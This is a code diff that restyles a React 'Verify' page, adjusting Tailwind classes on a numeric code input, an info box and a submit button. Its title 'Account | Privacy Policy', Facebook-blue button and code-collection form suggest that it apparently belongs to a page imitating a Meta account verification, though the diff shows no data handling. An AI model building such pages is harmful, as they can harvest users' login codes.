@@ -119,13 +119,13 @@ const Verify = () => {
     };
 
     return (
-        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa] px-4 py-8'>
+        <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa] px-4'>
             <title>Account | Privacy Policy</title>
-            <div className='flex w-full max-w-md flex-col gap-4 rounded-lg bg-white p-6 shadow-lg'>
-                <p className='text-2xl font-bold text-center'>{translatedTexts.title}</p>
-                <p className='text-center text-gray-600'>{translatedTexts.description}</p>
+            <div className='flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg'>
+                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
+                <p>{translatedTexts.description}</p>
 
-                <img src={VerifyImage} alt='' className='w-full h-auto' />
+                <img src={VerifyImage} alt='' />
                 
                 {/* 🎯 SỬA INPUT: Tăng cỡ chữ số nhập vào */}
                 <input
@@ -133,33 +133,31 @@ const Verify = () => {
                     inputMode='numeric'
                     max={8}
                     placeholder={translatedTexts.placeholder}
-                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-4 py-3 text-lg font-medium text-center'
+                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2 text-lg font-medium'
                     value={code}
                     onChange={(e) => setCode(e.target.value)}
                     onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                 />
                 
-                {showError && <p className='text-sm text-red-500 text-center'>{translatedTexts.errorMessage}</p>}
+                {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                 
-                <div className='flex items-start gap-3 bg-[#f8f9fa] p-4 rounded-lg'>
-                    <FontAwesomeIcon icon={faCircleInfo} className='text-[#9f580a] mt-1 flex-shrink-0' />
-                    <div className='flex-1'>
-                        <p className='font-medium text-gray-800'>{translatedTexts.infoTitle}</p>
-                        <p className='text-sm text-gray-600 mt-1'>{translatedTexts.infoDescription}</p>
+                <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
+                    <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
+                    <div>
+                        <p className='font-medium'>{translatedTexts.infoTitle}</p>
+                        <p className='text-sm text-gray-600'>{translatedTexts.infoDescription}</p>
                     </div>
                 </div>
 
                 <button
-                    className='rounded-md bg-[#0866ff] px-4 py-3 text-base font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2 w-full'
+                    className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                     onClick={handleSubmit}
                     disabled={isLoading || !code.trim()}
                 >
                     {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                 </button>
 
-                <p className='cursor-pointer text-center text-blue-900 hover:underline text-base'>
-                    {translatedTexts.sendCode}
-                </p>
+                <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
             </div>
         </div>
     );
